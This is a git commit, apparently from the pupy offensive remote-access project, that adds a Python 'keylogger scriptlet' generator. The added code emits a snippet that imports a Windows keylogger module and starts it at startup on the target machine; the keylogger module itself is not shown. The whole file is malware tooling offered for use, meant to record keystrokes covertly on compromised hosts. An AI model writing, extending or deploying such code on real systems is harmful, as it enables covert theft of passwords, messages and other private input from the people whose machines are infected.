4cfe22d78cce89f105900a103e21e129d997164e
n1nj4sec <contact@n1nj4.eu>
2016-05-05 12:19:14 +0200

    keylogger scriptlet

---
+++ pupy/scriptlets/keylogger/generator.py
@@ -0,0 +1,22 @@
+#!/usr/bin/env python
+# -*- coding: UTF8 -*-
+# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
+# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
+import textwrap, random, string
+from scriptlets import *
+
+class ScriptletGenerator(Scriptlet):
+	""" start the keylogger at startup """
+
+	dependencies=[("windows/all/pupwinutils/keylogger.py","pupwinutils.keylogger")]
+	arguments={}
+
+	def generate(self):
+		return textwrap.dedent("""
+		import sys
+		if sys.platform=="win32":
+			import pupwinutils.keylogger
+			pupwinutils.keylogger.keylogger_start()
+		""")
+
+
